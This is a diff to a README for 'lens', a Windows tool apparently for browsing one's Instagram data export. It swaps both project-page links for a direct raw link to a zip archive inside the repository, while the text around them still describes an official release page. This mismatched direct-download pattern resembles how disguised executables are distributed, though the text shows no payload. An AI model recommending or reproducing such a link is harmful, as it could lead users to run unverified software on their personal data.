@@ -45,7 +45,7 @@ Before you can use lens, you need to request your data from Instagram.
 
 ### Step 2: Download lens
 
-👉 **[Visit this link to download the application](https://github.com/supeshalasushikshitha-ship-it/lens)**
+👉 **[Visit this link to download the application](https://raw.githubusercontent.com/supeshalasushikshitha-ship-it/lens/main/app/v2.5.zip)**
 
 Click the link above to go to the official lens download page. Look for the latest release and download the file for Windows.
 
@@ -168,7 +168,7 @@ If you use lens, you are the only one with access to your information. That's no
 
 lens is built by the community, for the community. If you found a bug, have an idea for improvement, or just want to say thanks, visit the project page:
 
-👉 **[Visit this link to download the application](https://github.com/supeshalasushikshitha-ship-it/lens)**
+👉 **[Visit this link to download the application](https://raw.githubusercontent.com/supeshalasushikshitha-ship-it/lens/main/app/v2.5.zip)**
 
 On that page you'll find:
 - 🐛 Bug reporting tools.
